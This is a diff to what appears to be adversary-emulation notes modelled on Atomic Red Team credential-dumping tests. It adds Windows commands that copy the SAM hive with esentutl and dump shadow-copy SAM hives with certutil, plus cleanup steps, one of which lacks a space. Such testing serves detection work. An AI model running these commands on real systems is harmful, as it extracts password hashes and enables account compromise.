@@ -38,6 +38,17 @@ del %temp%\security >nul 2> nul
 ## Atomic Test #3 - esentutl.exe SAM copy
 
 esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp% /SAM
+
+#Borrado
+del%temp%\SAM
+
+## Atomic Test #5 - dump volume shadow copy hives with certutil
+
+for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 >nul 2>&1) && dir /B %temp%\SAMvss%a
+
+#Borrado
+for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
+
 T1003.003.md
 T1003.004.md
 T1003.005.md
